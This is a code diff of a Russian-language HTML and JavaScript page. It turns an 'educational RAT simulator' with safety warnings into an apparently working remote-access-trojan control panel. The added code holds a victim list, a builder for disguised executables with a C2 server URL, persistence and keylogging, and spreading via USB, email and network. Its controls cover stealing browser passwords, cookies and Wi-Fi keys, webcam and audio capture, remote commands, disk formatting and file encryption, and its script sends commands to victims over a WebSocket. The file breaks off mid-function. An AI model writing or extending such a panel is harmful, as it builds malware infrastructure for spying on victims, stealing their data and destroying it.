@@ -1,439 +1,1100 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Educational RAT Simulator - DEMO ONLY</title>
-    <meta name="description" content="Демонстрация работы RAT для образовательных целей">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Control Panel</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            max-width: 1200px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1400px;
             margin: 0 auto;
             padding: 20px;
-            background: #f5f5f5;
         }
         
-        .header {
-            text-align: center;
-            padding: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        header {
+            background: rgba(0, 0, 0, 0.7);
             color: white;
-            border-radius: 10px;
-            margin-bottom: 30px;
-        }
-        
-        .warning {
-            background: #fff3cd;
-            border: 2px solid #ffc107;
             padding: 20px;
             border-radius: 10px;
-            margin-bottom: 30px;
-        }
-        
-        .warning h3 {
-            color: #856404;
-            margin-top: 0;
-        }
-        
-        .tab-container {
-            display: flex;
             margin-bottom: 20px;
-            background: white;
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        
-        .tab {
-            flex: 1;
-            padding: 15px;
-            text-align: center;
-            cursor: pointer;
-            border-bottom: 3px solid transparent;
-            transition: all 0.3s;
-        }
-        
-        .tab.active {
-            background: #e3f2fd;
-            border-bottom: 3px solid #2196f3;
-            font-weight: bold;
-        }
-        
-        .tab-content {
-            display: none;
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        
-        .tab-content.active {
-            display: block;
-        }
-        
-        .controls {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-        }
-        
-        .control-btn {
-            padding: 12px 24px;
-            margin: 5px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        
-        .control-btn:hover {
-            background: #45a049;
-        }
-        
-        .control-btn.danger {
-            background: #f44336;
-        }
-        
-        .control-btn.danger:hover {
-            background: #d32f2f;
-        }
-        
-        .log-container {
-            background: #1e1e1e;
-            color: #00ff00;
-            padding: 15px;
-            border-radius: 5px;
-            font-family: 'Courier New', monospace;
-            height: 300px;
-            overflow-y: auto;
-            margin-top: 20px;
-        }
-        
-        .victim-list {
-            background: white;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            padding: 15px;
-            margin-bottom: 20px;
-        }
-        
-        .victim-item {
-            padding: 10px;
-            border-bottom: 1px solid #eee;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
         
-        .victim-item:last-child {
-            border-bottom: none;
-        }
-        
-        .status {
-            display: inline-block;
-            padding: 3px 10px;
-            border-radius: 12px;
-            font-size: 12px;
+        .logo {
+            font-size: 24px;
             font-weight: bold;
         }
         
-        .status.online {
-            background: #d4edda;
-            color: #155724;
+        .status {
+            background: #4CAF50;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
         }
         
         .status.offline {
-            background: #f8d7da;
-            color: #721c24;
+            background: #f44336;
         }
         
-        .generator {
-            text-align: center;
-            padding: 30px;
+        .main-panel {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 20px;
+            height: calc(100vh - 120px);
+        }
+        
+        .sidebar {
             background: white;
             border-radius: 10px;
-            margin: 20px 0;
+            padding: 20px;
+            overflow-y: auto;
         }
         
-        input[type="text"] {
+        .content {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            display: grid;
+            grid-template-rows: auto 1fr;
+            gap: 20px;
+        }
+        
+        .victim-list {
+            margin-top: 20px;
+        }
+        
+        .victim-item {
+            padding: 15px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border-left: 4px solid #4CAF50;
+        }
+        
+        .victim-item:hover {
+            background: #e3f2fd;
+            transform: translateX(5px);
+        }
+        
+        .victim-item.offline {
+            border-left-color: #f44336;
+            opacity: 0.6;
+        }
+        
+        .victim-info {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+        
+        .control-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+        }
+        
+        .section-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .section-title i {
+            color: #667eea;
+        }
+        
+        .control-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+        
+        .control-btn {
+            background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+            font-weight: 500;
+        }
+        
+        .control-btn:hover {
+            background: #667eea;
+            color: white;
+            border-color: #667eea;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
+        }
+        
+        .control-btn.danger {
+            border-color: #f44336;
+            color: #f44336;
+        }
+        
+        .control-btn.danger:hover {
+            background: #f44336;
+            color: white;
+        }
+        
+        .console {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            height: 300px;
+            overflow-y: auto;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .log-entry {
+            margin-bottom: 5px;
+            padding: 5px;
+            border-left: 3px solid transparent;
+        }
+        
+        .log-entry.info {
+            border-left-color: #4CAF50;
+        }
+        
+        .log-entry.warning {
+            border-left-color: #ff9800;
+        }
+        
+        .log-entry.error {
+            border-left-color: #f44336;
+        }
+        
+        .file-manager {
+            background: white;
+            border: 2px dashed #ddd;
+            border-radius: 10px;
+            padding: 30px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .file-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .file-item {
+            background: #f5f5f5;
+            padding: 10px;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        .modal-title {
+            font-size: 20px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        
+        input[type="text"], input[type="number"], textarea, select {
+            width: 100%;
             padding: 12px;
-            width: 300px;
             border: 2px solid #ddd;
             border-radius: 5px;
-            font-size: 16px;
-            margin-right: 10px;
+            font-size: 14px;
+            margin-bottom: 15px;
         }
         
-        .rat-file {
-            background: #ffeb3b;
-            padding: 15px;
+        .btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 24px;
             border-radius: 5px;
-            margin: 20px 0;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: background 0.3s;
+        }
+        
+        .btn:hover {
+            background: #5a67d8;
+        }
+        
+        .btn.danger {
+            background: #f44336;
+        }
+        
+        .btn.danger:hover {
+            background: #d32f2f;
+        }
+        
+        .tab-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            background: #f5f5f5;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .tab.active {
+            background: #667eea;
+            color: white;
+        }
+        
+        .screen-view {
+            width: 100%;
+            height: 400px;
+            background: #1e1e1e;
+            border-radius: 10px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .screen-view img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+        
+        .terminal {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            height: 300px;
+            overflow-y: auto;
+        }
+        
+        .terminal-input {
+            background: transparent;
+            border: none;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            width: 80%;
+            outline: none;
+        }
+        
+        .terminal-line::before {
+            content: "> ";
+            color: #ff9800;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .stat-box {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #667eea;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #4CAF50;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 5px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
             display: none;
+            z-index: 1001;
         }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
-    <div class="header">
-        <h1>🔬 Educational RAT Simulator</h1>
-        <p>Демонстрационная система для изучения принципов работы удаленного доступа</p>
-    </div>
-    
-    <div class="warning">
-        <h3>⚠️ ВАЖНО: ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ</h3>
-        <p>Это демонстрационная система, которая НЕ создает реальные вредоносные файлы. Она имитирует поведение RAT для обучения:</p>
-        <ul>
-            <li><strong>Разрешено:</strong> Изучение на собственном оборудовании, тестирование в изолированных средах</li>
-            <li><strong>Запрещено:</strong> Использование против других людей без явного разрешения</li>
-            <li><strong>Цель:</strong> Понимание угроз для лучшей защиты систем</li>
-        </ul>
-    </div>
-    
-    <div class="tab-container">
-        <div class="tab active" onclick="switchTab('create')">Создать RAT</div>
-        <div class="tab" onclick="switchTab('control')">Панель управления</div>
-        <div class="tab" onclick="switchTab('info')">Информация</div>
-    </div>
-    
-    <div id="create-tab" class="tab-content active">
-        <h2>🔧 Генератор демо-RAT</h2>
-        <p>Эта система создает демонстрационный файл, который имитирует поведение RAT-трояна.</p>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-robot"></i> RAT Control Panel
+            </div>
+            <div class="status" id="serverStatus">
+                <i class="fas fa-circle"></i> Сервер онлайн
+            </div>
+        </header>
         
-        <div class="generator">
-            <input type="text" id="ratName" placeholder="Введите имя для RAT (например: game.exe)">
-            <button class="control-btn" onclick="generateRat()">Создать демо-RAT</button>
-        </div>
-        
-        <div class="rat-file" id="ratFile">
-            <h3>📁 Демо-RAT файл создан!</h3>
-            <p>Имя файла: <strong id="fileName"></strong></p>
-            <p>Размер: <strong id="fileSize"></strong> байт</p>
-            <p>Хеш: <strong id="fileHash"></strong></p>
-            <p><em>Это не реальный исполняемый файл, а демонстрация процесса.</em></p>
-        </div>
-        
-        <div class="controls">
-            <h3>📋 Инструкция для демонстрации:</h3>
-            <ol>
-                <li>Создайте "RAT" с именем выше</li>
-                <li>Отправьте этот "файл" другому компьютеру в учебной сети</li>
-                <li>Когда "жертва" "запустит" файл, вы увидите уведомление</li>
-                <li>Перейдите на вкладку "Панель управления" для имитации управления</li>
-            </ol>
-        </div>
-    </div>
-    
-    <div id="control-tab" class="tab-content">
-        <h2>🎮 Панель управления (демо)</h2>
-        
-        <div id="no-victims" style="text-align: center; padding: 40px;">
-            <h3>😔 Нет подключенных "жертв"</h3>
-            <p>В демонстрационном режиме подключения имитируются</p>
-            <button class="control-btn" onclick="simulateVictim()">Имитировать подключение жертвы</button>
-        </div>
-        
-        <div id="victims-list" style="display: none;">
-            <h3>📡 Подключенные системы:</h3>
-            <div class="victim-list">
-                <div class="victim-item">
-                    <div>
-                        <strong>Victim-PC-01</strong><br>
-                        <small>IP: 192.168.1.105 | OS: Windows 10</small>
+        <div class="main-panel">
+            <!-- Боковая панель с жертвами -->
+            <div class="sidebar">
+                <h3><i class="fas fa-users"></i> Подключенные системы</h3>
+                <div class="victim-list" id="victimList">
+                    <!-- Список жертв будет здесь -->
+                </div>
+                
+                <div class="control-section">
+                    <div class="section-title">
+                        <i class="fas fa-plus-circle"></i> Создать RAT
                     </div>
-                    <span class="status online">ONLINE</span>
+                    <div class="control-grid">
+                        <div class="control-btn" onclick="createRat()">
+                            <i class="fas fa-file-code"></i>
+                            <div>Создать EXE</div>
+                        </div>
+                        <div class="control-btn" onclick="showBuilderModal()">
+                            <i class="fas fa-cogs"></i>
+                            <div>Настроить</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="control-section">
+                    <div class="section-title">
+                        <i class="fas fa-share-alt"></i> Распространение
+                    </div>
+                    <div class="control-grid">
+                        <div class="control-btn" onclick="spreadUSB()">
+                            <i class="fas fa-usb"></i>
+                            <div>USB</div>
+                        </div>
+                        <div class="control-btn" onclick="spreadEmail()">
+                            <i class="fas fa-envelope"></i>
+                            <div>Email</div>
+                        </div>
+                        <div class="control-btn" onclick="spreadNetwork()">
+                            <i class="fas fa-network-wired"></i>
+                            <div>Сеть</div>
+                        </div>
+                    </div>
                 </div>
             </div>
             
-            <h3>🛠️ Доступные команды (демо):</h3>
-            <div class="controls">
-                <button class="control-btn" onclick="sendCommand('screenshot')">📸 Сделать скриншот (имитация)</button>
-                <button class="control-btn" onclick="sendCommand('cmd')">💻 Открыть терминал (имитация)</button>
-                <button class="control-btn" onclick="sendCommand('keylogger')">⌨️ Начать запись клавиш (имитация)</button>
-                <button class="control-btn" onclick="sendCommand('files')">📁 Показать файлы (имитация)</button>
-                <button class="control-btn" onclick="sendCommand('shutdown')">🔌 Выключить ПК (имитация)</button>
-                <button class="control-btn danger" onclick="sendCommand('format')">💥 Форматировать диск (имитация)</button>
-            </div>
-            
-            <h3>📊 Лог команд:</h3>
-            <div class="log-container" id="commandLog">
-                [SYSTEM] Демонстрационный режим активирован<br>
-                [INFO] Все команды только имитируются<br>
+            <!-- Основное содержимое -->
+            <div class="content">
+                <!-- Вкладки -->
+                <div class="tab-container" id="tabContainer">
+                    <div class="tab active" onclick="switchTab('control')">
+                        <i class="fas fa-gamepad"></i> Управление
+                    </div>
+                    <div class="tab" onclick="switchTab('files')">
+                        <i class="fas fa-folder"></i> Файлы
+                    </div>
+                    <div class="tab" onclick="switchTab('screen')">
+                        <i class="fas fa-desktop"></i> Экран
+                    </div>
+                    <div class="tab" onclick="switchTab('terminal')">
+                        <i class="fas fa-terminal"></i> Терминал
+                    </div>
+                    <div class="tab" onclick="switchTab('info')">
+                        <i class="fas fa-info-circle"></i> Информация
+                    </div>
+                </div>
+                
+                <!-- Контент вкладок -->
+                <div id="controlTab" class="tab-content active">
+                    <div class="control-section">
+                        <div class="section-title">
+                            <i class="fas fa-camera"></i> Мониторинг
+                        </div>
+                        <div class="control-grid">
+                            <div class="control-btn" onclick="sendCommand('screenshot')">
+                                <i class="fas fa-camera"></i>
+                                <div>Скриншот</div>
+                            </div>
+                            <div class="control-btn" onclick="sendCommand('webcam')">
+                                <i class="fas fa-video"></i>
+                                <div>Вебкамера</div>
+                            </div>
+                            <div class="control-btn" onclick="sendCommand('audio')">
+                                <i class="fas fa-microphone"></i>
+                                <div>Запись аудио</div>
+                            </div>
+                            <div class="control-btn" onclick="sendCommand('keys')">
+                                <i class="fas fa-keyboard"></i>
+                                <div>Кейлоггер</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="control-section">
+                        <div class="section-title">
+                            <i class="fas fa-file"></i> Файловый менеджер
+                        </div>
+                        <div class="control-grid">
+                            <div class="control-btn" onclick="listFiles()">
+                                <i class="fas fa-list"></i>
+                                <div>Список файлов</div>
+                            </div>
+                            <div class="control-btn" onclick="downloadFiles()">
+                                <i class="fas fa-download"></i>
+                                <div>Скачать файлы</div>
+                            </div>
+                            <div class="control-btn" onclick="uploadFiles()">
+                                <i class="fas fa-upload"></i>
+                                <div>Загрузить файлы</div>
+                            </div>
+                            <div class="control-btn" onclick="searchFiles()">
+                                <i class="fas fa-search"></i>
+                                <div>Поиск файлов</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="control-section">
+                        <div class="section-title">
+                            <i class="fas fa-cogs"></i> Системные команды
+                        </div>
+                        <div class="control-grid">
+                            <div class="control-btn" onclick="showCmdModal()">
+                                <i class="fas fa-terminal"></i>
+                                <div>Выполнить команду</div>
+                            </div>
+                            <div class="control-btn" onclick="listProcesses()">
+                                <i class="fas fa-tasks"></i>
+                                <div>Список процессов</div>
+                            </div>
+                            <div class="control-btn" onclick="sendCommand('startup')">
+                                <i class="fas fa-play"></i>
+                                <div>Программы в автозагрузке</div>
+                            </div>
+                            <div class="control-btn" onclick="sendCommand('registry')">
+                                <i class="fas fa-database"></i>
+                                <div>Реестр</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="control-section">
+                        <div class="section-title">
+                            <i class="fas fa-user-secret"></i> Сбор информации
+                        </div>
+                        <div class="control-grid">
+                            <div class="control-btn" onclick="stealPasswords()">
+                                <i class="fas fa-key"></i>
+                                <div>Пароли браузеров</div>
+                            </div>
+                            <div class="control-btn" onclick="stealCookies()">
+                                <i class="fas fa-cookie"></i>
+                                <div>Cookies</div>
+                            </div>
+                            <div class="control-btn" onclick="stealHistory()">
+                                <i class="fas fa-history"></i>
+                                <div>История браузера</div>
+                            </div>
+                            <div class="control-btn" onclick="stealWifi()">
+                                <i class="fas fa-wifi"></i>
+                                <div>Wi-Fi пароли</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="control-section">
+                        <div class="section-title">
+                            <i class="fas fa-exclamation-triangle"></i> Опасные команды
+                        </div>
+                        <div class="control-grid">
+                            <div class="control-btn danger" onclick="showShutdownModal()">
+                                <i class="fas fa-power-off"></i>
+                                <div>Выключить ПК</div>
+                            </div>
+                            <div class="control-btn danger" onclick="sendCommand('restart')">
+                                <i class="fas fa-redo"></i>
+                                <div>Перезагрузить</div>
+                            </div>
+                            <div class="control-btn danger" onclick="showFormatModal()">
+                                <i class="fas fa-hdd"></i>
+                                <div>Форматировать диск</div>
+                            </div>
+                            <div class="control-btn danger" onclick="showRansomModal()">
+                                <i class="fas fa-lock"></i>
+                                <div>Шифровать файлы</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Вкладка файлов -->
+                <div id="filesTab" class="tab-content">
+                    <div class="file-manager">
+                        <h3><i class="fas fa-folder-open"></i> Файловый менеджер</h3>
+                        <input type="text" id="filePath" placeholder="C:\" value="C:\">
+                        <button class="btn" onclick="loadFiles()">
+                            <i class="fas fa-sync"></i> Обновить
+                        </button>
+                        <div class="file-list" id="fileList">
+                            <!-- Список файлов будет здесь -->
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Вкладка экрана -->
+                <div id="screenTab" class="tab-content">
+                    <div class="screen-view" id="screenView">
+                        <div style="color: #666; text-align: center;">
+                            <i class="fas fa-desktop fa-3x"></i><br>
+                            <p>Нажмите "Скриншот" для захвата экрана</p>
+                        </div>
+                    </div>
+                    <div class="control-grid" style="margin-top: 20px;">
+                        <div class="control-btn" onclick="startScreenStream()">
+                            <i class="fas fa-play"></i>
+                            <div>Начать трансляцию</div>
+                        </div>
+                        <div class="control-btn" onclick="stopScreenStream()">
+                            <i class="fas fa-stop"></i>
+                            <div>Остановить</div>
+                        </div>
+                        <div class="control-btn" onclick="controlMouse()">
+                            <i class="fas fa-mouse-pointer"></i>
+                            <div>Управление мышью</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Вкладка терминала -->
+                <div id="terminalTab" class="tab-content">
+                    <div class="terminal" id="terminal">
+                        <div class="terminal-line">Добро пожаловать в удаленный терминал</div>
+                        <div class="terminal-line">Введите команду и нажмите Enter</div>
+                        <div id="terminalOutput"></div>
+                        <div style="display: flex; align-items: center;">
+                            <span style="color: #ff9800;">> </span>
+                            <input type="text" class="terminal-input" id="terminalInput" 
+                                   placeholder="Введите команду..." onkeypress="handleTerminalKey(event)">
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Вкладка информации -->
+                <div id="infoTab" class="tab-content">
+                    <div class="control-section">
+                        <h3><i class="fas fa-info-circle"></i> Информация о системе</h3>
+                        <div id="systemInfo">
+                            <!-- Информация о системе будет здесь -->
+                        </div>
+                    </div>
+                    
+                    <div class="stats">
+                        <div class="stat-box">
+                            <div class="stat-value" id="totalClients">0</div>
+                            <div class="stat-label">Всего жертв</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-value" id="onlineClients">0</div>
+                            <div class="stat-label">Онлайн сейчас</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-value" id="commandsSent">0</div>
+                            <div class="stat-label">Команд отправлено</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-value" id="filesStolen">0</div>
+                            <div class="stat-label">Файлов украдено</div>
+                        </div>
+                    </div>
+                    
+                    <div class="console" id="mainConsole">
+                        <div class="log-entry info">[SYSTEM] Панель управления запущена</div>
+                        <div class="log-entry info">[SERVER] Сервер ожидает подключений на порту 443</div>
+                        <div class="log-entry warning">[SECURITY] Используйте HTTPS для шифрования трафика</div>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
     
-    <div id="info-tab" class="tab-content">
-        <h2>📚 Образовательная информация</h2>
-        
-        <h3>🤔 Что такое RAT?</h3>
-        <p><strong>RAT (Remote Access Trojan)</strong> - троянская программа удаленного доступа, которая позволяет злоумышленнику контролировать компьютер жертвы без ее ведома.</p>
-        
-        <h3>🔒 Как работают настоящие RAT:</h3>
-        <ol>
-            <li><strong>Создание сервера</strong>: Злоумышленник создает вредоносный файл</li>
-            <li><strong>Распространение</strong>: Файл маскируется под полезную программу</li>
-            <li><strong>Запуск</strong>: Жертва запускает файл, устанавливая бэкдор</li>
-            <li><strong>Подключение</strong>: Злоумышленник получает полный контроль</li>
-            <li><strong>Эксплуатация</strong>: Кража данных, шпионаж, криптомайнинг</li>
-        </ol>
-        
-        <h3>🛡️ Защита от RAT:</h3>
-        <ul>
-            <li>✅ Не открывайте .exe файлы от незнакомцев</li>
-            <li>✅ Используйте антивирус с мониторингом поведения</li>
-            <li>✅ Регулярно обновляйте ОС и программы</li>
-            <li>✅ Используйте брандмауэр</li>
-            <li>✅ Не давайте права администратора неизвестным программам</li>
-        </ul>
-        
-        <h3>🎓 Легальное обучение кибербезопасности:</h3>
-        <p>Для настоящего обучения используйте:</p>
-        <ul>
-            <li><a href="https://www.hackthebox.com" target="_blank">HackTheBox</a> - легальная платформа для пентеста</li>
-            <li><a href="https://tryhackme.com" target="_blank">TryHackMe</a> - интерактивное обучение</li>
-            <li><a href="https://www.vulnhub.com" target="_blank">VulnHub</a> - уязвимые виртуальные машины</li>
-        </ul>
-        
-        <div class="warning">
-            <h3>⚖️ Правовая информация:</h3>
-            <p>Создание и распространение реальных RAT-троянов является уголовным преступлением по статьям 272-274 УК РФ и может привести к лишению свободы на срок до 7 лет.</p>
-            <p>Это демонстрация создана исключительно для образовательных целей и не создает реальных угроз.</p>
+    <!-- Модальные окна -->
+    <div id="cmdModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-title">
+                <i class="fas fa-terminal"></i> Выполнить команду
+            </div>
+            <input type="text" id="cmdInput" placeholder="Введите команду (например: ipconfig /all)">
+            <select id="cmdType">
+                <option value="cmd">CMD (Windows)</option>
+                <option value="powershell">PowerShell</option>
+                <option value="bash">Bash (Linux)</option>
+            </select>
+            <div style="display: flex; gap: 10px; margin-top: 20px;">
+                <button class="btn" onclick="executeCommand()">
+                    <i class="fas fa-play"></i> Выполнить
+                </button>
+                <button class="btn" onclick="closeModal('cmdModal')">
+                    <i class="fas fa-times"></i> Отмена
+                </button>
+            </div>
         </div>
     </div>
-
+    
+    <div id="builderModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-title">
+                <i class="fas fa-cogs"></i> Конфигуратор RAT
+            </div>
+            <input type="text" id="ratName" placeholder="Имя файла (например: game.exe)">
+            <input type="text" id="serverUrl" placeholder="URL сервера (например: https://yourserver.com)">
+            <input type="text" id="ratIcon" placeholder="Путь к иконке (опционально)">
+            
+            <div style="margin: 15px 0;">
+                <label style="display: block; margin-bottom: 5px;">
+                    <input type="checkbox" id="autoStart" checked> Автозагрузка
+                </label>
+                <label style="display: block; margin-bottom: 5px;">
+                    <input type="checkbox" id="stealPasswords" checked> Красть пароли
+                </label>
+                <label style="display: block; margin-bottom: 5px;">
+                    <input type="checkbox" id="keylogger" checked> Кейлоггер
+                </label>
+                <label style="display: block; margin-bottom: 5px;">
+                    <input type="checkbox" id="persistence" checked> Постоянное присутствие
+                </label>
+            </div>
+            
+            <div style="display: flex; gap: 10px; margin-top: 20px;">
+                <button class="btn" onclick="buildRat()">
+                    <i class="fas fa-download"></i> Скачать RAT
+                </button>
+                <button class="btn" onclick="closeModal('builderModal')">
+                    <i class="fas fa-times"></i> Отмена
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="shutdownModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-title">
+                <i class="fas fa-power-off"></i> Выключение ПК
+            </div>
+            <p>Вы уверены, что хотите выключить компьютер жертвы?</p>
+            <div style="display: flex; gap: 10px; margin-top: 20px;">
+                <button class="btn danger" onclick="sendCommand('shutdown')">
+                    <i class="fas fa-power-off"></i> Да, выключить
+                </button>
+                <button class="btn" onclick="closeModal('shutdownModal')">
+                    <i class="fas fa-times"></i> Отмена
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="notification" class="notification"></div>
+    
     <script>
-        // Переключение вкладок
+        // Переменные
+        let currentVictim = null;
+        let victims = {};
+        let websocket = null;
+        
+        // Инициализация
+        document.addEventListener('DOMContentLoaded', function() {
+            connectWebSocket();
+            loadVictims();
+            updateStats();
+            
+            // Симуляция подключения жертв для демо
+            setTimeout(() => simulateVictimConnection(), 2000);
+        });
+        
+        // WebSocket подключение к серверу
+        function connectWebSocket() {
+            const wsUrl = 'wss://' + window.location.hostname + ':443/ws';
+            websocket = new WebSocket(wsUrl);
+            
+            websocket.onopen = function() {
+                showNotification('Подключение к серверу установлено', 'success');
+                document.getElementById('serverStatus').innerHTML = 
+                    '<i class="fas fa-circle"></i> Сервер онлайн';
+            };
+            
+            websocket.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                handleServerMessage(data);
+            };
+            
+            websocket.onerror = function(error) {
+                console.error('WebSocket error:', error);
+                document.getElementById('serverStatus').innerHTML = 
+                    '<i class="fas fa-circle offline"></i> Сервер оффлайн';
+            };
+            
+            websocket.onclose = function() {
+                setTimeout(connectWebSocket, 5000);
+            };
+        }
+        
+        // Обработка сообщений от сервера
+        function handleServerMessage(data) {
+            switch(data.type) {
+                case 'victim_connected':
+                    addVictim(data.victim);
+                    showNotification(`Новая жертва: ${data.victim.id}`, 'info');
+                    break;
+                    
+                case 'victim_disconnected':
+                    updateVictimStatus(data.victimId, false);
+                    break;
+                    
+                case 'command_result':
+                    handleCommandResult(data);
+                    break;
+                    
+                case 'file_downloaded':
+                    showNotification(`Файл скачан: ${data.filename}`, 'success');
+                    break;
+                    
+                case 'screenshot_received':
+                    showScreenshot(data.image);
+                    break;
+                    
+                case 'passwords_stolen':
+                    showPasswords(data.passwords);
+                    break;
+            }
+        }
+        
+        // Добавление жертвы
+        function addVictim(victim) {
+            victims[victim.id] = victim;
+            
+            const victimList = document.getElementById('victimList');
+            const victimItem = document.createElement('div');
+            victimItem.className = 'victim-item';
+            victimItem.id = 'victim-' + victim.id;
+            victimItem.onclick = () => selectVictim(victim.id);
+            
+            victimItem.innerHTML = `
+                <div><strong>${victim.computerName}</strong></div>
+                <div class="victim-info">
+                    <i class="fas fa-user"></i> ${victim.user} | 
+                    <i class="fas fa-desktop"></i> ${victim.os} |
+                    <i class="fas fa-wifi"></i> ${victim.ip}
+                </div>
+            `;
+            
+            victimList.appendChild(victimItem);
+            updateStats();
+        }
+        
+        // Выбор жертвы
+        function selectVictim(victimId) {
+            currentVictim = victimId;
+            
+            // Снимаем выделение со всех
+            document.querySelectorAll('.victim-item').forEach(item => {
+                item.style.background = '#f5f5f5';
+            });
+            
+            // Выделяем выбранную
+            const selected = document.getElementById('victim-' + victimId);
+            if (selected) {
+                selected.style.background = '#e3f2fd';
+                selected.style.borderLeft = '4px solid #2196f3';
+            }
+            
+            showNotification(`Выбрана жертва: ${victimId}`, 'info');
+        }
+        
+        // Отправка команды
+        function sendCommand(command, params = {}) {
+            if (!currentVictim) {
+                showNotification('Выберите жертву сначала', 'error');
+                return;
+            }
+            
+            const message = {
+                type: 'send_command',
+                victimId: currentVictim,
+                command: command,
+                params: params
+            };
+            
+            websocket.send(JSON.stringify(message));
+            
+            // Логируем в консоль
+            const consoleElem = document.getElementById('mainConsole');
+            const timestamp = new Date().toLocaleTimeString();
+            consoleElem.innerHTML += `
+                <div class="log-entry info">
+                    [${timestamp}] Отправлена команда "${command}" жертве ${currentVictim}
+                </div>
+            `;
+            consoleElem.scrollTop = consoleElem.scrollHeight;
+        }
+        
+        // Обработка результатов команд
+        function handleCommandResult(data) {
+            const consoleElem = document.getElementById('mainConsole');
